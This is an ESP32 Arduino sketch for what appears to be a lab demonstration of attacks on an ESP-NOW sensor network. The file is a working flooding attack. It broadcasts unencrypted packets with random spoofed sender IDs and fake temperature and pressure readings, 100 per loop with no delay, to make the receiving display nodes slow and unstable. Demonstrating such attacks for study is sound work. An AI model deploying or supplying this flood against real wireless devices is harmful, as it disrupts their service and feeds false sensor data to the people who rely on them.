// ============================================================
// PHASE 1 - ATTACK 3: FLOODING / DENIAL OF SERVICE (DoS)
// Upload to the 5th (attack) ESP32
// Open Serial Monitor at 115200 baud
// Watch: Display nodes packet counter jumps rapidly
//        Display updates become slow/unstable
// ============================================================

#include <esp_now.h>
#include <WiFi.h>

// Message structure - must match Sender.ino exactly
typedef struct {
    int   senderID;
    float temp;
    float pressure;
    int   button;
    int   command;
} Message;

Message floodMsg;
uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
long totalSent = 0;

void setup() {
    Serial.begin(115200);
    delay(500);

    Serial.println("");
    Serial.println("============================================");
    Serial.println("  ESP-NOW FLOODING ATTACK - DoS");
    Serial.println("  Attack Demo - Phase 1");
    Serial.println("  Sending 100 packets per loop, no delay");
    Serial.println("============================================");
    Serial.println("");

    WiFi.mode(WIFI_STA);
    esp_now_init();

    // Add broadcast peer
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, broadcastAddress, 6);
    peer.channel = 0;
    peer.encrypt = false;
    esp_now_add_peer(&peer);

    Serial.println("[*] Flood attack starting NOW...");
    Serial.println("[*] Watch display nodes become unstable!");
    Serial.println("");
}

void loop() {
    // Send burst of 100 garbage packets - no delay between them
    for (int i = 0; i < 100; i++) {
        floodMsg.senderID = random(10, 99);   // Random invalid node IDs
        floodMsg.temp     = random(0, 999);
        floodMsg.pressure = random(800, 1300);
        floodMsg.button   = random(0, 2);
        floodMsg.command  = 0;
        esp_now_send(broadcastAddress, (uint8_t*)&floodMsg, sizeof(floodMsg));
        totalSent++;
    }

    // Print status every 1000 packets
    if (totalSent % 1000 == 0) {
        Serial.print("[FLOOD] Total packets sent: ");
        Serial.println(totalSent);
    }

    // NO delay - maximum possible flood rate
}
